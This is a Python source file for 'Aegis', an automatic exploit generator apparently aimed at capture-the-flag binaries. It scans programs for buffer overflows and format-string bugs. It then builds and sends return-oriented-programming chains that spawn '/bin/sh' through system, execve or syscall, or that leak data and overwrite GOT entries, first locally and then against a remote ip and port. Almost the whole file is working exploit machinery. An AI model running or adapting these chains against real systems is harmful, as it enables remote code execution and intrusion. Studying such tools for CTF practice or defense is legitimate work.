#!/usr/bin/env python3
import logging
import argparse
import os

from pwn import *
from rage.rage import rAEG
from rage.machine import Machine
from rage.against import Against
from rage.log import aegis_log

class Aegis:
    """Class that does the control flow for analysis and execution."""

    def __init__(self, binary, libc, ip, port):
        """Initiaize important variables for the binary."""
        self.binary = os.path.abspath(binary)
        self.elf = ELF(binary)
        self.rop = ROP(self.elf)

        if libc is not None:
            self.libc = ELF(libc)
        else:
            self.libc = self.elf.libc

        self.ip = ip
        self.port = port
        self.has_format = False

        self.symbol = rAEG(self.binary)
        self.machine = Machine(self.binary)
        
        self.static_analysis() 
        self.against = Against(self.binary, self.libc, self.machine, self.ip, self.port)

        self.symbolic_padding = None
        self.padding = None
        self.failed = False

        self.got_targets = None

    def static_analysis(self):
        """Set variables from the output of the static analysis."""
        self.machine.check_mitigations()
        self.machine.check_vulnerable_copy()
        self.machine.check_vulnerable_input()
        printf_addrs = self.machine.check_vulnerable_printf()

        if len(printf_addrs) > 0:
            self.has_format = True 
            self.got_targets = self.machine.find_target_got_entries(printf_addrs[0])

    def symbolic_analysis(self):
        """Set variables from the output of the symbolic analysis."""
        self.symbol.stack_smash()
        self.symbolic_padding = self.symbol.symbolic_padding
        if not self.has_format:
            self.has_format = self.symbol.has_format
        if self.has_format == True:
            aegis_log.info(f"Found printf format string vulnerability")

    def setup_exploit(self):
        """Choose which exploit to do for the binary."""
        
        win_gadget = self.machine.find_win_gadget()
        function = self.machine.find_functions(["win", "system", "execve", "syscall"])
        string = self.machine.find_string_address()
        self.against.chain = b""
        writeable = self.machine.find_writeable_address()

        if len(function) > 0:
            function = function[0]
        else:
            function = None

        if self.symbolic_padding != None:
            #if self.machine.padding_size == len(self.symbolic_padding):
            self.against.padding = self.symbolic_padding
            #if self.failed:
                #self.against.padding = b"A" * self.machine.padding_size
        else:
            self.against.padding = b"A" * self.machine.padding_size

        if len(self.against.padding) == 0:
            aegis_log.warning(f"Could not find buffer overflow")

            if self.has_format == True:
                self.against.format_leak()

                if self.against.flag == None:
                    if win_gadget:
                        got_addr = self.elf.got[self.got_targets[-1]]
                        self.against.format_write(win_gadget, got_addr)
                        self.exploit()
                else:
                    aegis_log.info(f"Found flag through stack leak: {self.against.flag}")

        else: 

            # Check if one call functions are in the binary
            if win_gadget:
                aegis_log.debug(f"Setting up return to win with gadget")
                #if self.failed:
                    #self.against.chain += p64(self.machine.find_functions(["_fini"])[0])
                self.against.chain += p64(win_gadget)
                self.against.exploit = self.against.padding + self.against.chain
            elif function == "win":
                aegis_log.debug(f"Setting up return to win with function")
                self.against.chain += self.against.rop_chain_call_function(function, [0x1, 0x2, 0x3])
                self.against.exploit = self.against.padding + self.against.chain
            elif function == "system":
                aegis_log.debug(f"Setting up return to system")
                if not string:
                    self.against.chain += self.against.rop_chain_write_string(b"/bin/sh\x00", writeable)
                    self.against.chain += self.against.rop_chain_call_function(function, [writeable])
                if string:
                    self.against.chain += self.against.rop_chain_call_function(function, [string])

                self.against.exploit = self.against.padding + self.against.chain
            elif function == "execve":
                aegis_log.debug(f"Setting up return to execve")
                if not string:
                    self.against.chain += self.against.rop_chain_write_string(b"/bin/sh\x00", writeable)
                    self.against.chain += self.against.rop_chain_call_function(function, [writeable])
                if string:
                    self.against.chain += self.against.rop_chain_call_function(function, [string, 0, 0])
                self.against.exploit = self.against.padding + self.against.chain
            elif function == "syscall":
                aegis_log.debug(f"Setting up return to syscall")

                if not string:
                    self.against.chain += self.against.rop_chain_write_string(b"/bin/sh\x00", writeable)
                    self.against.chain += self.against.rop_chain_call_function(function, [writeable])
                if string:
                    self.against.chain += self.against.rop_chain_call_function(function, [59, string, 0, 0]) 
                self.against.exploit = self.against.padding + self.against.chain
            else:
                if len(self.machine.find_functions(["puts","printf"])) > 0 and self.machine.find_reg_gadget("rdi") != None:
                    aegis_log.debug(f"Setting up return to puts")
                    self.against.chain = self.against.rop_ret2puts()
                elif len(self.machine.find_functions(["gets"])) > 0 and self.machine.find_reg_gadget("rdi") != None:
                    aegis_log.debug(f"Setting up return to dlresolve")
                    self.against.chain = self.against.rop_chain_dlresolve()
            self.exploit()
                


    def write_solve_script(self):
        """Write the solve to a script for writeup purposes."""

    def exploit(self):
        """Create and run exploit using Against module."""
        aegis_log.debug(f"Setting up exploit")
        chain_len = len(self.against.chain)
        exp = open("exploit", "wb")

        if chain_len > 0:
            aegis_log.debug(f"Stack Alignment Check: {(chain_len + len(self.against.padding)) % 16}, Exploit Length: {chain_len + len(self.against.padding)}")
        else:
            aegis_log.debug(f"Sending format string payload {self.against.format_exploit}")

        if args.GDB:
            self.against.process = self.against.start("GDB")
            self.against.send_exploit()
            #self.against.verify_flag()

            aegis_log.debug(f"Adding ret to chain")
            ret = p64(self.rop.find_gadget(["ret"])[0])
                
            chain_len = len(self.against.chain)
            aegis_log.debug(f"Stack Alignment Check: {(chain_len + len(self.against.padding)) % 16}, Exploit Length: {chain_len + len(self.against.padding)}")
            self.against.chain =  self.against.chain[:(chain_len-8)] + ret + self.against.chain[(chain_len-8):]

            self.against.process = self.against.start("GDB")
            self.against.send_exploit()
            #self.against.verify_flag()
        
        else:
            self.against.process = self.against.start("")
            self.against.send_exploit()
            exp.write(self.against.exploit)
            if self.against.verify_flag() == False:
                ret = p64(self.rop.find_gadget(["ret"])[0])
                chain_len = len(self.against.chain)
                aegis_log.debug(f"Stack Alignment Check: {(chain_len + len(self.against.padding)) % 16}, Exploit Length: {chain_len + len(self.against.padding)}")
                self.against.chain =  self.against.chain[:(chain_len-8)] + ret + self.against.chain[(chain_len-8):]
                self.against.process = self.against.start("")

                self.against.send_exploit()
                if self.against.verify_flag() == False:
                    self.against.process = self.against.start("REMOTE")
                    self.against.send_exploit()
                    
            else:
                self.against.process = self.against.start("REMOTE")
                self.against.send_exploit()
 
def print_title():

    aegis_title = """
  ▄████████    ▄████████    ▄██████▄   ▄█     ▄████████
  ███    ███   ███    ███   ███    ███ ███    ███    ███
  ███    ███   ███    █▀    ███    █▀  ███▌   ███    █▀
  ███    ███  ▄███▄▄▄      ▄███        ███▌   ███
▀███████████ ▀▀███▀▀▀     ▀▀███ ████▄  ███▌ ▀███████████
  ███    ███   ███    █▄    ███    ███ ███           ███
  ███    ███   ███    ███   ███    ███ ███     ▄█    ███
  ███    █▀    ██████████   ████████▀  █▀    ▄████████▀    
    """


    shield_1 = """
                  ██                                          
              ████░░████                                      
          ████░░░░░░░░░░████                                  
      ████░░░░░░░░░░░░░░░░░░████                              
██████░░░░▒▒▒▒░░░░░░░░░░▓▓▓▓░░░░██████                        
██░░░░░░▓▓▒▒▓▓▓▓░░░░░░▓▓▓▓▒▒▓▓░░░░░░██                        
██░░░░░░░░▒▒░░▓▓▓▓▒▒▓▓▓▓░░▓▓░░░░░░░░██                        
██░░░░░░▒▒▓▓░░▒▒▒▒  ▓▓▓▓░░▓▓▒▒░░░░░░██                        
██░░▓▓▓▓▓▓░░▒▒▒▒      ▓▓▓▓░░▓▓▓▓▓▓░░██                        
  ██░░▓▓░░▓▓▓▓  ▓▓▓▓▓▓  ▓▓▓▓░░▓▓░░██                          
  ██░░▒▒▒▒▓▓      ▒▒      ▒▒▒▒▓▓░░██                          
  ██░░▓▓▓▓▒▒▓▓▓▓▓▓▒▒▓▓▓▓▓▓▓▓▓▓▓▓░░██                          
  ██░░▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓░░██                          
    ██░░▓▓▓▓▒▒▒▒▓▓▒▒▒▒▒▒▒▒▒▒▓▓░░██                            
    ██░░▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓░░██                            
    ██░░▓▓▓▓▒▒▒▒▓▓▒▒▒▒▒▒▒▒▒▒▒▒░░██                            
      ██░░▒▒▒▒▓▓▒▒▒▒▒▒▓▓▒▒▒▒░░██                              
      ██░░▓▓▓▓▒▒▓▓▒▒▒▒▒▒▓▓▓▓░░██                              
        ██░░▓▓▒▒▓▓▓▓▓▓▓▓▓▓░░██                                
          ██░░▓▓░░░░░░▓▓░░██                                  
            ██░░░░░░░░░░██                                    
              ████░░████                                      
                  ██                                          

    """

    pillar = """      
    ░░▒▒▒▒░░▒▒░░░░░░     
  ░░░░░░░░░░░░░░░░░░░░   
  ░░░░░░░░░░▒▒░░░░░░     
    ░░▒▒▒▒▒▒░░░░░░░░     
      ▒▒▒▒▒▒░░░░░░       
      ▒▒▒▒▒▒░░░░░░       
      ▒▒▒▒▒▒░░▒▒░░       
      ▒▒▒▒▒▒░░▒▒░░       
      ▒▒▒▒▒▒░░░░░░       
      ▒▒▒▒▒▒░░░░░░       
      ▒▒▒▒▒▒░░░░░░       
      ▒▒▒▒▒▒░░░░░░       
      ▒▒▒▒▒▒░░░░░░       
      ▒▒▒▒▒▒░░░░░░       
      ▒▒▒▒▒▒░░░░░░       
    ▒▒▒▒▒▒░░░░░░░░░░     
    ▒▒▒▒░░░░░░░░░░░░     
    ▒▒▒▒▒▒▒▒░░░░░░░░   
    """
    print(aegis_title)
    print(pillar)

if __name__ == "__main__":
    logging.getLogger("angr").setLevel(logging.CRITICAL)
    logging.getLogger("os").setLevel(logging.CRITICAL)
    logging.getLogger("pwnlib").setLevel(logging.CRITICAL)
    logging.getLogger("aegis_log").setLevel(logging.DEBUG)
    parser = argparse.ArgumentParser( 
        prog = "Aegis", 
        description = "An automatic exploit generator framework using binaryninja, angr, ROPgadget, and pwntools"
    )

    parser.add_argument("-bin", metavar="binary", type=str, help="The binary that is to be exploited", default=None)
    parser.add_argument("-libc", metavar="libc", type=str, help="The libc shared library object linked to the binary", default=None)
    parser.add_argument("-ip", metavar="ip", type=str, help="The ip address of the remote challenge or connection info", default=None)
    parser.add_argument("-port", metavar="port", type=str, help="The port of the remote challenge", default=None)
    parser.add_argument("-login", metavar="login", type=str, help="Your login to your ctfd account", default=None)
    parser.add_argument("-pw", metavar="password", type=str, help="Your password to your ctfd account", default=None)
    parser.add_argument("-ctfd", metavar="website", type=str, help="The ctfd webpage", default=None)

    arguments = parser.parse_args()
    print_title()

    aeg = Aegis(arguments.bin, arguments.libc, arguments.ip, arguments.port)
    aeg.static_analysis()
    aeg.symbolic_analysis()
    aeg.setup_exploit()
